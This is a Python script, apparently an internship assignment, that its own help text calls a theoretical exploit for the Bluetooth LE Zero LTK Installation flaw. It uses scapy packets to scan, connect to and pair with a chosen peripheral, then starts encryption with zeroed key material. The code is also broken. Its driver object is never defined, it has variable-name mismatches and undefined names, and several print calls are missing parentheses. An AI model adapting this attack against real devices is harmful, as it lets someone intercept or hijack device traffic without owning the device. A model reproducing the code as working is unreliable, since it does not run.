#!/usr/bin/python3
import sys, os, re
import argparse
import scapy
from scapy.all import *
from scapy.layers.bluetooth import *
from uuid import getnode as get_mac

central_address = get_mac()
access_address = 0x8E89BED6
SECURE_CONNECTIONS = 0x08

def verify_mac_address(address):
    """
    Verifies that the target's address is a valid MAC address
    Otherwise raises an exception
    """

    if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", address.lower()):
        return address.lower()
    raise Exception("Invalid format for MAC address")

def encrypt():
    """
    Starts encryption (Vol 6, Part D, 6.6)
    """

    #"When both devices support LE Secure Connections, the EDIV and Rand are
    #set to zero"
    encryption_request = BTLE() / BTLE_CTRL() / LL_ENC_REQ(rand=0, ediv=0,
    skd_c=0, iv_c=0) 

    driver.send(encryption_request)

    response = driver.receive()

    if response:
        encryption_response = BTLE(packet)
        if LL_ENC_RSP in encryption_response:
            request = driver.receive()
            if request:

                if LL_START_ENC_REQ in request:
                    print("Peripheral accepted to start encryption")

def pair():
    """
    Central initiates pairing with Secure Connections 
    """

    # Secure Manager Pairing request
    SM_Pair = BTLE(access_address=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                    iocap=0, #depends on the I/O capabilities
                    oob=0,
                    authentication=SECURE_CONNECTIONS,
                    max_key_size=16,
                    initiator_key_distribution=0x0,
                    responder_key_distribution=0x0
                    )

    driver.send(SM_pair)

    packet = driver.receive()
    response = BTLE(packet)
    if SM_Pairing_Response in response:
        if not (response.authentication & SECURE_CONNECTIONS):
            raise Exception("Peripheral does not support Secure Connections")


def connect():
    """
    Attempts to connect to advertiser
    """
    
    global target_address, central_address

    # Creates a connection request packet for advertiser (Vol 6, Part B
    # 2.3.3.1)
    connect_req = BTLE() / BTLE_ADV(RxAdd=target_address_type) / BTLE_CONNECT_REQ(
                    InitA=central_address,
                    AdvA=target_address,
                    AA=access_address,
                    crc_init=0,
                    win_size=2,
                    win_offset=1,
                    interval=16,
                    latency=0,
                    timeout=0,
                    chM=0,
                    SCA=0,
                    hop=5 #random value in the range 5 to 16
                    )

    # Theoretical send of the connection request
    driver.send(connect_req)

    # Theoretical raw reception of a packet
    packet = driver.receive()
    response = BTLE(packet)
    if BTLE_DATA in response:
        print("Connected to {}", target_address)
        #TODO: Advertiser can send security request


def scan():
    """
    Checks if devices in the target_address is advertising and connectable
    """

    global target_address, target_address_type

    print('Searching for {}...'.format(target_address))

    # At this stage, the advertiser must be in advertising state

    # Theoretical raw reception
    packet = driver.receive()

    # Constructs BTLE packet from raw bytes for parsing
    response = BTLE(packet)

    # Connectable and scannable undirected advertising event (Vol 6, Part B, 2.3.1.1)
    if BTLE_ADV_IND in response and response.AdvA == target_address:

        # Gets the advertiser's address type
        target_address_type = response.TxAdd
                
        # Creates a scan request packet for target
        scan_req =  BTLE() / BTLE_ADV(RxAdd=target_address_type) /
            BTLE_SCAN_REQ(ScanA=scan_address, AdvA=target_address)
        
        # Theoretical send of the packet through the Bluetooth driver
        driver.send(scan_req)
    
        # Theoretical raw reception of a packet
        packet = driver.receive()

        # Constructs BTLE packet from raw bytes for parsing
        response = BTLE(packet)
                
        if SCAN_RSP in response:
            print("Scanned {}".format(target_address)

    # Connectable directed advertising event (Vol 6, Part B 2.3.1.2)
    elif BTLE_ADV_DIRECT_IND in response and response.AdvA == target_address:
                
        # Gets the advertiser's address type
        target_address_type = response.TxAdd
                
        print("Scanned {}".format(target_address)

def main():
    """
    Attempts to connect to a pheripheral device and to initiate a Secure
    Connections pairing procedure skipping its key generation phase
    """

    # To only process responses from the accept_list (Vol 6 Part Part B 4.3)
    global target_address

    parser = argparse.ArgumentParser(
            prog="Zero-LTK-installation",
            description="Fully theoretical exploit for the Zero LTK Installation vulnerability",
            epilog="Developed by Louisa Malki-Haegel for the Quarkslab internship assignment")

    parser.add_argument(
            "-t",
            "--target",
            type=verify_mac_address,
            required=True,
            help="Targeted peripheral's MAC address")

    try:
        args = parser.parse_args()
        target_address = args.target
        
        #TODO: Connect dongle
        
        scan()
        connect()
        pair()
        encrypt()
    
    except Exception as e:
        parser.error("Error: " + str(e))

if __name__ == "__main__":
    main()
